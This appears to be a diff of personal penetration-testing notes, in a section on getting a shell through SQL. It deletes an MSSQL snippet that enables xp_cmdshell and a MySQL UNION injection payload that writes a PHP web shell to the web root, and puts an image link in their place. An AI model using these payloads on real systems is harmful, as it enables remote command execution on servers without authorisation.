@@ -28,19 +28,7 @@
 
 # SQL Shellcode excution
 ## Manual shell
-1. mssql shell
-    ``` 
-        EXECUTE sp_configure 'show advanced options', 1;
-        EXECUTE sp_configure 'xp_cmdshell', 1;
-    ```
-
-2. mysql shell
-
-    care about column number
-
-    ```
-    ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
-    ```
+![alt text](image-1.png)
 
 
 ## Automated 
